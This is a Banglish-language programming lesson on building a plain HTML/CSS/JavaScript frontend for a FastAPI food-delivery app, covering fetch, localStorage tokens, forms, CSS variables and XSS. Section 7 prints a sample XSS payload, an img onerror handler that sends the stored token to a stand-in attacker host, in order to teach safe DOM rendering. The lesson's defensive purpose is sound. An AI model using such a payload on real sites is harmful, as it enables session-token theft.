# Lesson 12: Frontend er Shuru: HTML, CSS, JavaScript ar `fetch`

Ei lesson er code: `frontend/index.html`, `frontend/css/style.css`, `frontend/js/api.js`, `frontend/js/ui.js`, `frontend/js/pages/auth.js`, `app/main.py` (shesh er 3 line)

Ekhon porjonto app ta shudhu API chilo, Swagger diye chalate hoto. Ebar ashol website: customer khabar order korbe, vendor order accept korbe, rider deliver korbe, admin approve korbe, shob browser e.

## 1. Chalao

Kichu notun install korte hobe na:

```bash
python -m scripts.seed_demo        # khali database e (age theke na kora thakle)
uvicorn app.main:app --reload
```

Browser e **http://127.0.0.1:8000** kholo. Login page e "Customer" button chap dile phone ar password nije boshe jay.

Swagger ekhono ache: http://127.0.0.1:8000/docs

## 2. Kon technology, ar keno

| Choice | Keno |
|---|---|
| Plain HTML + CSS + JavaScript | Browser nijei bojhe. Kono install, build, Node.js lage na |
| React / Vue **na** | Egula shikhte alada shomoy lage. Age mul jinish bujhle pore React shohoj hoy |
| FastAPI e serve kora | Ek command e backend + frontend. Ek e address, tai CORS er jhamela nai (section 8) |

Tin ta bhasha, tin ta kaj:

| | Kaj | Udahoron |
|---|---|---|
| **HTML** | Page e ki ache (gothon) | heading, button, form |
| **CSS** | Dekhte kemon (rong, jayga, font) | button shobuj, card er kona gol |
| **JavaScript** | Ki kore (kaj) | button chaple API ke request |

## 3. FastAPI kivabe website dey

`app/main.py` er shesh e:

```python
FRONTEND_DIR = Path(__file__).resolve().parent.parent / "frontend"
app.mount("/", StaticFiles(directory=FRONTEND_DIR, html=True), name="frontend")
```

`StaticFiles` mane "ei folder er file gula je chay take dao". `html=True` mane `/` chaile `index.html` dao.

Eta **shobar shesh e** lekha, karon FastAPI route gula upor theke niche milay (Lesson 7, section 4). `/api/v1/...` age mile jay; baki shob (`/`, `/css/style.css`, `/js/main.js`) file hisebe khoja hoy.

Ei karone health check `/` theke `/api/v1/health` e shorano hoyeche: `/` ekhon website.

## 4. `index.html`: page er kongkal

```html
<header class="topbar"> ... <nav id="nav"></nav> </header>
<main id="app"></main>
<div id="toasts"></div>
<script type="module" src="/js/main.js"></script>
```

Page prae khali! Shudhu 3 ta "box": upore menu (`#nav`), majhe page (`#app`), ar choto notification (`#toasts`). Baki shob JavaScript bhore dey. Eke bole **Single Page Application (SPA)**: ek ta HTML page, JavaScript bhitorer jinish bodlay.

`type="module"` dile JavaScript file gula ek ta arek ta theke `import` korte pare, Python er motoi:

```js
import { api } from "./api.js";
```

## 5. `api.js`: backend er shathe kotha

Shob request ek function diye jay:

```js
const restaurants = await api("/restaurants");
const order = await api("/orders", { method: "POST", body: { delivery_address: "Mirpur 10" } });
```

Bhitore ki hoy:

```js
const token = getToken();
if (token) headers.Authorization = `Bearer ${token}`;      // Lesson 3 er token
...
response = await fetch(`/api/v1${path}`, { method, headers, body: payload });
...
if (!response.ok) throw new ApiError(response.status, errorMessage(data, response.status));
```

- **`fetch`** browser er built-in function, HTTP request pathay. Swagger e "Try it out" chaple ja hoto, eta shei kaj kore
- **`await`** mane "uttor na asha porjonto opekkha koro". Python er `async`/`await` er moto. Majhe page atke thake na
- Error hole `ApiError` throw kore, jate page `error.status === 409` dekhe alada kaj korte pare (section 8 er cart udahoron)
- `errorMessage` FastAPI er `{"detail": "..."}` ke ek line lekha banay. `422` hole field er naam shoho

Login ektu alada, karon OAuth2 form (Lesson 3, section 6):

```js
api("/auth/login", { method: "POST", form: { username: phone, password } });
```

## 6. Token kothay rakhi?

Login er por token `localStorage` e rakha hoy:

```js
localStorage.setItem("khabo_token", token);
```

`localStorage` holo browser er chhoto storage, page bondho korleo thake. Tai porer bar khulle abar login korte hoy na (60 minute porjonto).

Code e protibar `try { ... } catch` keno? Private mode e ba setting e storage bondho thakle `localStorage` error dey. Tokhon app bhangbe na, shudhu login mone rakhbe na.

60 minute por token batil hole server `401` dey. `api.js` tokhon token muche `auth-expired` event pathay, `main.js` sheta shune login page e niye jay.

**Nirapotta r kotha (viva):** `localStorage` e rakha token page er je kono JavaScript porte pare. Tai XSS (section 7) atkano khub joruri. Boro app e onekshomoy `httpOnly` cookie use hoy, jeta JavaScript porte pare na. Amader project e `localStorage` shohoj, ar jhuki ta jana thakai bhalo.

## 7. `ui.js`: page banano, ar XSS theke bachano

Page er protita jinish `el()` function diye banano:

```js
el("button", { class: "btn btn-primary", onclick: placeOrder }, "Place order")
```

Mane: `<button class="btn btn-primary">Place order</button>`, click e `placeOrder` chalbe.

Keno shorashori HTML lekha (`innerHTML`) hoy na? Dhoro ekjon vendor restaurant er naam dilo:

```
<img src=x onerror="fetch('https://chor.com?t='+localStorage.khabo_token)">
```

`innerHTML` e boshale browser eta ke HTML bhabe ar code ta **chalay**: je dekhbe tar token chor er kache chole jabe. Eke bole **XSS (Cross-Site Scripting)**.

`el()` lekha ke shob shomoy **text** hisebe boshay:

```js
node.append(child instanceof Node ? child : String(child));
```

`append` e string dile browser sheta okkhor hisebe dekhay, kokhono chalay na. Tai oi naam ta screen e huhu `<img src=x ...>` lekha hisebe dekhabe. Amader browser test e ek dom eta check kora hoyeche.

**Niyom: user er lekha kichu kokhono `innerHTML` e na.** Ei project e `innerHTML` ekbaro use hoy ni.

Baki helper:

| Function | Kaj |
|---|---|
| `mount(box, ...)` | box er bhitor muche notun jinish boshay |
| `money(745)` | `"৳745"` |
| `clock(iso)` | server er UTC shomoy ke local shomoy e (Lesson 6, section 7) |
| `busy(button, fn)` | kaj cholar shomoy button bondho, error hole lal notification |
| `toast("...")` | niche choto notification |

`busy` keno? Net dhir hole manush "Place order" dui bar chape. Prothom chap e button bondho hoye jay, tai dui ta order hoy na.

## 8. Login page (`pages/auth.js`)

```js
const form = el("form", {
  onsubmit: (event) => {
    event.preventDefault();                 // browser er nijer "page reload" thamao
    const data = formData(form);            // { phone: "...", password: "..." }
    busy(submit, () => logIn(data.phone, data.password, ctx));
  },
}, ...);
```

`<input required minlength="8">` er moto attribute diye browser nijei form check kore, server e pathanor **age**. Kintu eta shudhu shubidha, nirapotta na: keu browser bypass kore sorasori API te pathate pare. Ashol check server e (Pydantic, Lesson 2). **Niyom: frontend er check user er shubidhar jonno, backend er check nirapottar jonno.**

## 9. CSS er buddhi

`style.css` er shurute shob rong **variable** e:

```css
:root {
  --brand: #0f6b4f;     /* shobuj: button, link */
  --accent: #c2571a;    /* mosla rong: dam, logo r bindu */
}
.btn-primary { background: var(--brand); }
```

Puro app er rong bodlate shudhu ekhane bodlalei hoy. Ar `@media (prefers-color-scheme: dark)` e ek e variable gula dark rong e — phone dark mode e thakle app o dark.

Ar `@media (max-width: 720px)` er bhitore phone er jonno niyom: duita column ek ta hoye jay, order er dhap gula upor-niche.

Font **Hind Siliguri**: Bangla ar English duitai shundor dekhay. Internet na thakle computer er nijer font e dekhabe, app chole.

## 10. Nije koro

1. `style.css` e `--brand` er rong bodlao (jemon `#1e4fa3`). Page reload koro. Koyta jaygay rong bodlalo?
2. App er naam "Khabo" bodlao. Kon kon file e lekha ache khuje bodlao. (Hint: `index.html` e duita jaygay.)
3. Browser e **F12** chepe **Network** tab kholo, tarpor ekta restaurant e dhuko. Kon kon `/api/v1/...` request gelo? Ekta te click kore **Headers** e `Authorization` khujo.
4. **Console** tab e likho: `localStorage.getItem("khabo_token")`. Ki ashlo? Lesson 3 er moto `jwt.decode` diye pore dekho.
5. XSS nije dekho: vendor diye ekta restaurant er naam dao `<b>Mota</b>`. Admin page e ki dekha jay: mota lekha, na `<b>` shoho?
6. Viva proshno:
   - SPA ki?
   - `fetch` ar `await` ki kore?
   - XSS ki? Ei app e kivabe atkano?
   - Browser e form check thakleo server e abar check kori keno?
   - Token `localStorage` e rakhar jhuki ki?
